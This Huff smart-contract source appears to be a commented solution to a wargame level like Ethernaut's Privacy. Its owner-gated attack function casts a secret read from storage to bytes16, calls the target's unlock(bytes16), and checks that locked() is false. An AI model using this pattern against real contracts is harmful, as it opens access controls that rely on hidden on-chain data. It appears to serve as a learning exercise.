// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant INSTANCE_SLOT = FREE_STORAGE_POINTER()

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] OWNER_SLOT is the 0th slot in storage
    sstore          // [] - sstore consumes top 2 stack items. The first item is
                    // the key (storage location) and the second item is the value (item to store)

    // Copy constructor argument (address) into memory
    0x20            // [0x20] - This will be the size for the the code we will copy to memory
    dup1            // [0x20, 0x20] - This will be used to calculate offset for which we will copy code from current environment
    codesize        // [code_size, 0x20, 0x20] - codesize pushes the size of code in current environment on to stack
    sub             // [offset, 0x20] - sub consumes top two items off stack and subtracts item 1 from item 2. Used to calculate offset for codecopy
    returndatasize  // [0x00, offset, 0x20] - 0x00 is the destination offset in memory for the code we will copy
    codecopy        // [] - codecopy consumes top 3 items off stack. codecopy(destOffset, offset, size)

    // Copy address from memory into INSTANCE_SLOT in storage
    returndatasize  // [0x00] - This is the offset in memory for which to copy 32 bytes from (our address param) 
    mload           // [address_param] - mload consumes top item off stack and pushes 32 bytes from that offset in memory onto stack => mload(offset)
    [INSTANCE_SLOT] // [0x01, address_param] - INSTANCE_SLOT is the 1st storage slot where we will store address_param
    sstore          // [] - sstore consumes top two items off stack. sstore(key, value)
}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [msg.sender]
    [OWNER_SLOT]    // [0x00] - storage slot where owner is stored
    sload           // [owner] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

// Attack function
#define macro ATTACK() = takes(1) returns (0) {
    // Copy `unlock(bytes16)` func sig to memory to use as calldata for CALL 
    0xe1afb08c      // [0xe1afb08c, param] - func sig for `unlock(bytes16)`
    0x00            // [0x00, 0xe1afb08c, param] - byte offset
    mstore          // [param] - copied func sig to memory starting at byte offset 0x00

    // PARAM: 0x15463ea5510bbfe4490141f3b82ca295f89430976d30feb9f703d624ede325bb 

    // MEMORY:
    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000e1afb08c -> `unlock(bytes16)` func sig

    // convert param (bytes32) to bytes16 to use as calldata for CALL
    0xffffffffffffffffffffffffffffffff00000000000000000000000000000000
    and             // [bytes16_param] - performing a bitwise and to discard higher order bytes (converting bytes32 ot bytes16)
    0x20            // [0x20, bytes16_param] - bytes offset
    mstore          // [] - copied bytes16_param to memory starting from bytes offset 0x20

    // MEMORY:
    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000e1afb08c -> `unlock(bytes16)` func sig
    // [OFFSET 32] 15463ea5510bbfe4490141f3b82ca29500000000000000000000000000000000 -> param converted to bytes16

    // CALL into instance
    [INSTANCE_SLOT] // [0x01] - storage slot where instance address is
    sload           // [instance] - copied istance address onto stack 
    0x00            // [0x00, instance] - size of return data (none)
    0x00            // [0x00, 0x00, instance] - byte offset in memory where return data will be copied
    0x24            // [0x24, 0x00, 0x00, instance] - size of calldata
    0x1c            // [0x1c, 0x24, 0x00, 0x00, instance] - byte offset in memory where calldata starts
    0x00            // [0x00, 0x1c, 0x24, 0x00, 0x00, instance] - msg.value (0)
    dup6            // [instance, 0x00, 0x1c, 0x24, 0x00, 0x00, instance] - duplicated instance to top of stack
    gas             // [instance, gas, 0x00, 0x1c, 0x24, 0x00, 0x00, instance] - gas we are sending with call (gasleft())
    call            // [success, instance] - consumes 7 items off stack and returns 1 if call did not revert, 0 otherwise
    iszero          // [0/1, instance]
    throw_error     // [throw_error, 0/1, instance]
    jumpi           // [instance]

    // Copy `locked()` func sig to memory to use as calldata for STATICCALL
    0xcf309012      // [0xcf309012, instance]  - func sig for `locked()`
    0x00            // [0x00, 0xcf309012, instance] - byte offset
    mstore          // [instance] - copied func sig to memory starting at byte offset 0x00 (write over prev func sig)

    // MEMORY:
    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000cf309012 -> `locked()` func sig
    // [OFFSET 32] 15463ea5510bbfe4490141f3b82ca29500000000000000000000000000000000 -> param converted to bytes16

    // STATICCALL into instance
    0x20            // [0x20, instance] - size of return data (bool)
    0x00            // [0x00, 0x20, instance] - byte offset in memory where return data will be copied
    0x04            // [0x04, 0x00, 0x20, instance] - size of calldata
    0x1c            // [0x1c, 0x04, 0x00, 0x20, instance] - byte offset in memory where calldata starts
    dup5            // [instance, 0x1c, 0x04, 0x00, 0x20, instance] - duplicated instance to top of stack
    gas             // [gas, instance, 0x1c, 0x04, 0x00, 0x20, instance] - gas to send with call (gasleft())
    staticcall      // [success, instance] - consumes top 6 items and returns 1 if call was successful, 0 otherwise
    iszero          // [0/1, instance]
    throw_error     // [throw_error, 0/1, instance]
    jumpi           // [instance]
    pop             // pop

    // MEMORY:
    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000000000000 -> False (bool)
    // [OFFSET 32] 15463ea5510bbfe4490141f3b82ca29500000000000000000000000000000000 -> param converted to bytes16

    // Check return value to verify it is Fasle (bool)
    0x00            // [0x00] - byte offset
    mload           // [bool] - copied return data (bool) to stack starting from byte offset 0x00 in memory
    throw_error     // [throw_error, bool]
    jumpi           // []

    stop
}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0xd93f709f   // [0xd93f709f, func_sig, func_sig] - pushing func sig of 'attack(bytes16)' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack       // [attack_label, 0/1, func_sig] - attack_label is a label (byte offset) for the attack instructions
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    throw_error: // label for revert path
        0x00 0x00 revert

    attack:      // label for attack instructions
        ONLY_OWNER()
        0x04     // [0x04] - byte offset in calldata
        calldataload // [param] - consumes top item and pushes 32 bytes from calldata starting from byte offset
        ATTACK()
}
